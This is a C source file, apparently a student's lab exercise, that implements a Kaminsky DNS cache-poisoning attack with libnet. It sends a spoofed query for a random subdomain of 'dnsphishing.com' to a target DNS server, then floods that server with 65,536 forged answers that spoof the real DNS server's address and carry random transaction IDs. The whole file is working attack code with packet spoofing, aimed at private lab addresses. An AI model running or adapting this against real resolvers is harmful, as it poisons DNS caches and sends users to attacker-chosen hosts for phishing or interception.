/*		    GNU GENERAL PUBLIC LICENSE
		       Version 2, June 1991
 Copyright (C) 1989, 1991 Free Software Foundation, Inc.,
 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.
*/
#include <libnet.h>
#include <unistd.h>
#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/stat.h>

#define RAND_LIMIT 10000000		// Limit for Random number generation - SANIL

    int c;
    u_char *cp;
    libnet_t *l;
    libnet_ptag_t t;
    char errbuf[LIBNET_ERRBUF_SIZE];
    int u_src_port = 33333;
    
    char payload_file[FILENAME_MAX] = "";
    char attack_domain[] = "dnsphishing.com";	// target domain - SANIL
    
    char target_dns_ip[] = "192.168.56.103";	// Target dns DNS1 server - SANIL
    char client_ip[] = "192.168.56.102";		// User/client ip - SANIL
    char real_dns_server[] = "192.168.56.101";	// DNS2 server IP - SANIL
    
    char dev[] = "eth11";			// Device Interface
    
    u_long i_target_dns_ip;
    u_long i_client_ip;
    u_long i_real_dns_server;
    char subdomain_hostname[50];
    char *payload_location;			// payload to be sent
    
    int x;
    int y = 0;
    int udp_src_port = 1;       /* UDP source port */
    int udp_des_port = 1;       /* UDP dest port */
    int z;
    int i;
    int payload_filesize = 0;
    u_char eth_saddr[6];	/* NULL Ethernet saddr */
    u_char eth_daddr[6]; 	/* NULL Ethernet daddr */
    u_char eth_caddr[6]; 	/* NULL Ethernet daddr */
    u_char eth_proto[60];       /* Ethernet protocal */
    u_long eth_pktcount;        /* How many packets to send */
    long nap_time;              /* How long to sleep */
    u_char ip_proto[40];
    u_char spa[4]={0x0, 0x0, 0x0, 0x0};
    u_char tpa[4]={0x0, 0x0, 0x0, 0x0};
    u_char *device = NULL;
    u_char i_ttos_val = 0;	/* final or'd value for ip tos */
    u_char i_ttl;		/* IP TTL */
    u_short e_proto_val = 0;    /* final resulting value for eth_proto */
    u_short ip_proto_val = 0;   /* final resulting value for ip_proto */

/* SANIL */
    u_long i_des_addr;		/* IP dest addr */
    u_long i_src_addr;		/* IP source addr */
    u_char i_ttos[90];		/* IP TOS string */

    u_long t_ack;		/* TCP ack number */
    u_long t_seq;		/* TCP sequence number */

    int t_src_port;		/* TCP source port */
    int t_des_port;		/* TCP dest port */
    int t_win;		/* TCP window size */
    int t_urgent;		/* TCP urgent data pointer */
    int i_id;		/* IP id */
    int i_frag;		/* IP frag */

    char ip_file[FILENAME_MAX] = "";
    char tcp_file[FILENAME_MAX] = "";
    char eth_file[FILENAME_MAX] = "";

    u_char t_control[65];	/* TCP control string */

    int flag;			// to indicate when to stop sending a new DNS request - SANIL

// END

int
main(int argc, char *argv[])
{
    /*
     *  Initialize the library.  Root priviledges are required.
     */
    l = libnet_init(
            LIBNET_LINK,                             /* injection type */
			dev,                                /* network interface eth0, eth1, etc. NULL is default.*/
            errbuf);                                 /* error buffer */
    if (l == NULL)
    {
        fprintf(stderr, "libnet_init() failed: %s", errbuf);
        exit(EXIT_FAILURE); 
    }


    i_target_dns_ip = libnet_name2addr4(l, target_dns_ip, LIBNET_RESOLVE);
    i_client_ip = libnet_name2addr4(l, client_ip, LIBNET_RESOLVE);
    i_real_dns_server = libnet_name2addr4(l, real_dns_server, LIBNET_RESOLVE);

/* SANIL - Commented */
    // server mac
//    sscanf("08, 00, 27, 32, 5b, 06", "%x, %x, %x, %x, %x, %x", &eth_saddr[0], &eth_saddr[1], &eth_saddr[2], &eth_saddr[3], &eth_saddr[4], &eth_saddr[5]);
    // gateway mac
//    sscanf("00, 00, 00, 00, 00, 01", "%x, %x, %x, %x, %x, %x", &eth_daddr[0], &eth_daddr[1], &eth_daddr[2], &eth_daddr[3], &eth_daddr[4], &eth_daddr[5]);
    // client mac
//    sscanf("08, 00, 27, d5, 40, a3", "%x, %x, %x, %x, %x, %x", &eth_caddr[0], &eth_caddr[1], &eth_caddr[2], &eth_caddr[3], &eth_caddr[4], &eth_caddr[5]);

srand((int)time(0));	// init random seed


// SANIL - Added to get the input header files: the one with *_query

    while ((c = getopt (argc, argv, "p:t:i:e:")) != EOF)
    {
        switch (c)
        {
            case 'p':
                strcpy(payload_file, optarg);
                break;
            case 't':
                strcpy(tcp_file, optarg);
                break;
            case 'i':
                strcpy(ip_file, optarg);
                break;
            case 'e':
                strcpy(eth_file, optarg);
                break;
            default:
                break;
        }
    }

    if (optind != 9)
    {    
        //usage();			// SANIL - commented
        exit(0);
    }
    

flag = 1;   

/* SANIL */
//load_payload_query();

//END

while (flag) 
{
	flag = 0;		// Make flag 0 to send out only 1 request

/* Generate a random domain name - SANIL */
	int randomNumber = (rand()%RAND_LIMIT);
	while (randomNumber<RAND_LIMIT) randomNumber*=10;

	sprintf(subdomain_hostname, ".x-%d.%s", randomNumber,attack_domain);
    	printf("\nStarting Kaminsky Attacking for domain %s \n",subdomain_hostname);
    	convertDomain();

/* Code for Kaminsky Attack - SANIL */

/* Load the header and payload query files - SANIL */
	load_payload_query();
	load_ethernet();
	load_tcp_udp();
	load_ip();
/* END */

	    // always builds UDP  
	 t = libnet_build_udp(
		    33333,                                /* source port */
		    53,                                /* destination port */
		    LIBNET_UDP_H + payload_filesize,           /* packet length */
		    0,                                         /* checksum */
		    payload_location,                          /* payload */
		    payload_filesize,                          /* payload size */
		    l,                                         /* libnet handle */
		    0);                                        /* libnet id */

	   if (t == -1)
	    {
		fprintf(stderr, "Can't build UDP header: %s\n", libnet_geterror(l));
		goto bad;
	    } 

	    t = libnet_build_ipv4(
		LIBNET_IPV4_H + LIBNET_UDP_H + payload_filesize,          /* length */
		0,                         /* TOS */
		12345,                                                  /* IP ID */
		IP_DF,                                                /* IP Frag */
		255,                                                 /* TTL */
		IPPROTO_UDP,                                          /* protocol */
		0,                                                     /* checksum */
		i_client_ip,                                            /* source IP */
		i_target_dns_ip,                                            /* destination IP */
		NULL,                                                  /* payload */
		0,                                                     /* payload size */
		l,                                                     /* libnet handle */
		0);                                                    /* libnet id */
	    if (t == -1)
	    {
		fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
		goto bad;
	    }
	    t = libnet_build_ethernet(
		eth_saddr,                                   /* ethernet destination */
		eth_caddr,                                   /* ethernet source */
		ETHERTYPE_IP,                                 /* protocol type */
		NULL,                                        /* payload */
		0,                                           /* payload size */
		l,                                           /* libnet handle */
		0);                                          /* libnet id */
	    
	    if (t == -1)
	    {
		fprintf(stderr, "Can't build ethernet header: %s\n", libnet_geterror(l));
		goto bad;
	    }
	     /*	
	     *  Write it to the wire.
	     */

	    c = libnet_write(l);
	    free(payload_location);
	    libnet_destroy(l);

	// Send 65536 spoofed DNS responses - SANIL
	for (i=0;i<65536;i++) {	// send 100 fake response, as the server response quite fast

        l = libnet_init(
            LIBNET_LINK,                             /* injection type */
	    dev,                                /* network interface eth0, eth1, etc. NULL is default.*/
            errbuf);                                 /* error buffer */
        load_payload_answer();
	    // always builds UDP
	    t = libnet_build_udp(
		    53,                                /* source port */
		    33333,                                /* destination port */
		    LIBNET_UDP_H + payload_filesize,           /* packet length */
		    0,                                         /* checksum */
		    payload_location,                          /* payload */
		    payload_filesize,                          /* payload size */
		    l,                                         /* libnet handle */
		    0);                                        /* libnet id */
	    if (t == -1)
	    {
		fprintf(stderr, "Can't build UDP header: %s\n", libnet_geterror(l));
		goto bad;
	    }
	    t = libnet_build_ipv4(
		LIBNET_IPV4_H + LIBNET_UDP_H + payload_filesize,          /* length */
		0,                         /* TOS */
		12345,                                                  /* IP ID */
		IP_DF,                                                /* IP Frag */
		255,                                                 /* TTL */
		IPPROTO_UDP,                                          /* protocol */
		0,                                                     /* checksum */
		i_real_dns_server,                                            /* source IP */
		i_target_dns_ip,                                            /* destination IP */
		NULL,                                                  /* payload */
		0,                                                     /* payload size */
		l,                                                     /* libnet handle */
		0);                                                    /* libnet id */
	    if (t == -1)
	    {
		fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
		goto bad;
	    }
	    t = libnet_build_ethernet(
		eth_saddr,                                   /* ethernet destination */
		eth_daddr,                                   /* ethernet source */
		ETHERTYPE_IP,                                 /* protocol type */
		NULL,                                        /* payload */
		0,                                           /* payload size */
		l,                                           /* libnet handle */
		0);                                          /* libnet id */
	    if (t == -1)
	    {
		fprintf(stderr, "Can't build ethernet header: %s\n", libnet_geterror(l));
		goto bad;
	    }
	     /*	
	     *  Write it to the wire.
	     */
        c = libnet_write(l);
        free(payload_location);
        libnet_destroy(l);
	
    }
    l = libnet_init(
            LIBNET_LINK,                             /* injection type */
	    dev,                                /* network interface eth0, eth1, etc. NULL is default.*/
            errbuf);                                 /* error buffer */

/* END OF KAMINSKY ATTACK CODE */

}
printf("****  %d packets sent  **** (packetsize: %d bytes each)\n",i,c);  /* tell them what we just did */
    /* give the buf memory back */
    libnet_destroy(l);
    return (0);
bad:
    libnet_destroy(l);
    return (EXIT_FAILURE);
	    
}

// Convert the domain: find out how many characters follow the dot '.' in the sub-domain as that is required to generate the response payload 
convertDomain() {
    unsigned int len = (unsigned)strlen(subdomain_hostname);
    int i=0;
    while (len>0) {
        if (subdomain_hostname[len-1]=='.') {
            subdomain_hostname[len-1]=i;
            i=0;
        }
        else {
            i++;
        }
        len--;
    }
}

/* load_payload: load the payload into memory */
load_payload_query()
{
    FILE *infile;
    struct stat statbuf;
    int i = 0;
    int j = 0;
    int c = 0;
    unsigned int len = (unsigned)strlen(subdomain_hostname);
    char payload_file[] = "payload_query";
    stat(payload_file, &statbuf);
    payload_filesize = statbuf.st_size+len;
    payload_location = (char *)malloc(payload_filesize * sizeof(char));
    if (payload_location == 0)
    {
        printf("Allocation of memory for payload failed.\n");
        exit(0); 
    }
    /* open the file and read it into memory */
    infile = fopen(payload_file, "r");
    
// SANIL - Read the payload query into memory
    while((c = getc(infile)) != EOF)
    //while(fread(payload_location, 1, 11, infile)); 	
    {
        if (i==12) {
            for (j=0;j<len;j++) {
                *(payload_location + 12 + j) = subdomain_hostname[j];
            }
            i = 12 + len;
        }
        *(payload_location + i) = c;
        i++;
    }

    fclose(infile);
}

/* load_payload: load the payload into memory */
load_payload_answer()
{
    FILE *infile;
    struct stat statbuf;
    int i = 2;
    int j = 0;
    int c = 0;
    unsigned int len = (unsigned)strlen(subdomain_hostname);
    char payload_file[] = "payload_answer";

    /* SANIL - Randomnly generate transaction IDs: tranID[0] and tranID[1]*/
    int tranID[] = {rand()%256,rand()%256};
    stat(payload_file, &statbuf);
    payload_filesize = statbuf.st_size+len+2;
    payload_location = (char *)malloc(payload_filesize * sizeof(char));
    if (payload_location == 0)
    {
        printf("Allocation of memory for payload failed.\n");
        exit(0); 
    }

    /* open the payload file */
    infile = fopen(payload_file, "r");	
    
    while((c = getc(infile)) != EOF)
    {
	// INSERT THE HOSTNAME AT THE 12TH BYTE - SANIL
        if (i==12) {
            for (j=0;j<len;j++) {
                *(payload_location + i + j) = subdomain_hostname[j];
            }
            i+=len;
        }
        *(payload_location + i) = c;
        i++;
    }

// Replace the Transaction ID with a randomnly generated Transaction ID - SANIL
    *payload_location = tranID[0];
    *(payload_location+1) = tranID[1];
//END

    fclose(infile);
}


// SANIL

/* load_ethernet: load ethernet data file into the variables */
load_ethernet()
{
    FILE *infile;

    char s_read[40];		// Server MAC Address
    char d_read[40];		// DNS2 MAC Address
    char c_read[40];		// Client MAC Address
    char p_read[60];
    char count_line[40];

    infile = fopen(eth_file, "r");

    fgets(s_read, 40, infile);         /*read the source mac*/
    fgets(d_read, 40, infile);         /*read the destination mac*/
    fgets(c_read, 40, infile);         /*read the destination mac*/
    fgets(p_read, 60, infile);         /*read the desired protocal*/
    fgets(count_line, 40, infile);     /*read how many packets to send*/

    sscanf(s_read, "saddr,%x, %x, %x, %x, %x, %x", &eth_saddr[0], &eth_saddr[1], &eth_saddr[2], &eth_saddr[3], &eth_saddr[4], &eth_saddr[5]);
    sscanf(d_read, "daddr,%x, %x, %x, %x, %x, %x", &eth_daddr[0], &eth_daddr[1], &eth_daddr[2], &eth_daddr[3], &eth_daddr[4], &eth_daddr[5]);
    sscanf(c_read, "caddr,%x, %x, %x, %x, %x, %x", &eth_caddr[0], &eth_caddr[1], &eth_caddr[2], &eth_caddr[3], &eth_caddr[4], &eth_caddr[5]);
    sscanf(p_read, "proto,%s", &eth_proto);
    sscanf(count_line, "pktcount,%d", &eth_pktcount);

    fclose(infile);
}

    /* load_tcp_udp: load TCP or UDP data file into the variables */
load_tcp_udp()
{
    FILE *infile;

    char sport_line[20] = "";
    char dport_line[20] = "";
    char seq_line[20] = "";
    char ack_line[20] = "";
    char control_line[65] = "";
    char win_line[20] = "";
    char urg_line[20] = "";

    infile = fopen(tcp_file, "r");

    fgets(sport_line, 15, infile);	/*read the source port*/
    fgets(dport_line, 15, infile); 	/*read the dest port*/
    fgets(win_line, 12, infile);	/*read the win num*/
    fgets(urg_line, 12, infile);	/*read the urg id*/
    fgets(seq_line, 13, infile);	/*read the seq num*/
    fgets(ack_line, 13, infile);	/*read the ack id*/
    fgets(control_line, 63, infile);	/*read the control flags*/

    /* parse the strings and throw the values into the variable */

    sscanf(sport_line, "sport,%d", &t_src_port);
    sscanf(sport_line, "sport,%d", &udp_src_port);
    sscanf(dport_line, "dport,%d", &t_des_port);
    sscanf(dport_line, "dport,%d", &udp_des_port);
    sscanf(win_line, "win,%d", &t_win);
    sscanf(urg_line, "urg,%d", &t_urgent);
    sscanf(seq_line, "seq,%ld", &t_seq);
    sscanf(ack_line, "ack,%ld", &t_ack);
    sscanf(control_line, "control,%[^!]", &t_control);

    fclose(infile); /*close the file*/
}

    /* load_ip: load IP data file into memory */
load_ip()
{
    FILE *infile;

    char proto_line[40] = "";
    char id_line[40] = "";
    char frag_line[40] = "";
    char ttl_line[40] = "";
    char saddr_line[40] = "";
    char daddr_line[40] = "";
    char tos_line[90] = "";
    char z_zsaddr[40] = "";
    char z_zdaddr[40] = "";
    char inter_line[15]="";

    infile = fopen(ip_file, "r");

    fgets(id_line, 11, infile);		/* this stuff should be obvious if you read the above subroutine */
    fgets(frag_line, 13, infile);	/* see RFC 791 for details */
    fgets(ttl_line, 10, infile);
    fgets(saddr_line, 24, infile);
    fgets(daddr_line, 24, infile);
    fgets(proto_line, 40, infile);
    fgets(inter_line, 15, infile);
    fgets(tos_line, 78, infile);
    
    sscanf(id_line, "id,%d", &i_id);
    sscanf(frag_line, "frag,%d", &i_frag);
    sscanf(ttl_line, "ttl,%d", &i_ttl);
    sscanf(saddr_line, "saddr,%s", &z_zsaddr);
    sscanf(daddr_line, "daddr,%s", &z_zdaddr);
    sscanf(proto_line, "proto,%s", &ip_proto);
    sscanf(inter_line, "interval,%d", &nap_time);
    sscanf(tos_line, "tos,%[^!]", &i_ttos);

    i_src_addr = libnet_name2addr4(l, z_zsaddr, LIBNET_RESOLVE);
    i_des_addr = libnet_name2addr4(l, z_zdaddr, LIBNET_RESOLVE);
    
    fclose(infile);
}

// END

/* EOF */

